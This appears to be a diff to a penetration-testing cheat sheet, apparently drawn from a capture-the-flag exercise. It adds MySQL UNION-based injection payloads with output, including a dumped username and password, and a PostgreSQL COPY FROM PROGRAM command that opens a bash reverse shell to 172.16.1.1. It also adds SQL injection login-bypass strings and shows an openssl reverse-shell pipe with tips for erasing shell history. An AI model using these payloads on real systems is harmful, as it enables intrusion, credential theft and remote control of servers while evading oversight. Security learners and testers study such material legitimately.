@@ -70,6 +70,59 @@ SELECT DISTINCT last_name,first_name FROM contacts WHERE first_name IS NOT NULL 
 SELECT DISTINCT email FROM contacts WHERE email LIKE "%@target.com" ORDER BY email
 DELETE from profiles WHERE rowid='53';
 UPDATE hostvulns SET tool="Nessus";
+
+# MySQL Injection
+
+# General.
+1 UNION SELECT 1,2,3,4
+1 UNION SELECT NULL,NULL,NULL,@@hostname		ubuntu
+1 UNION SELECT NULL,NULL,NULL,version()			5.7.17-0ubuntu0.16.04.2
+1 UNION SELECT NULL,NULL,NULL,current_user()		root@localhost
+1 UNION SELECT NULL,NULL,NULL,user()			root@localhost
+1 UNION SELECT NULL,NULL,NULL,UUID()			534c63c1-2e4a-11e9-bb88-00505692e5ab
+
+# List all dbs.
+1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
+	information_schema
+	challenge
+	mysql
+	performance_schema
+	sys
+
+# List current db.
+1 UNION SELECT NULL,NULL,NULL,database()
+	challenge
+
+# List tables in the current db.
+1 UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.tables WHERE table_schema=‘challenge’
+	comments
+	users
+
+# List column names in the table ‘comments’.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=‘comments’
+	comments id
+	comments username
+	comments comment
+	comments post_date
+
+# List all the data in comments.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(id, 0x0A, username, 0x0A, comment, 0x0A, post_date, 0x0A) FROM comments
+
+# List column names in the table ‘users’.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'
+	users id
+	users username
+	users password
+	users is_admin
+	users signup_date
+	users USER
+	users CURRENT_CONNECTIONS
+        users TOTAL_CONNECTIONS
+
+# List all the data in users.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(username, 0x0A, password) FROM users
+fl4gk33p3r	2DCsG47k5C77X5uMwIwO
+Login > Profile > flag
 ------------------------------------------------------------------------------------------------------
 
 # Postgresql
@@ -103,3 +156,19 @@ openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -
 
 Make sure to `export HISTFILE=/dev/null` when you get on, and `kill -9 $$` when you get off.
 
+# Example
+
+psql -U postgres -h <target IP> platforms
+\c postgres
+create table redteam(data text);
+copy redteam from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
+------------------------------------------------------------------------------------------------------
+
+# SQL Injection
+
+'+OR+1=1--
+admin’;--
+‘ or 1=1--
+‘ or 2=2--
+‘ or 2-1=1--
+‘ or 2>1--
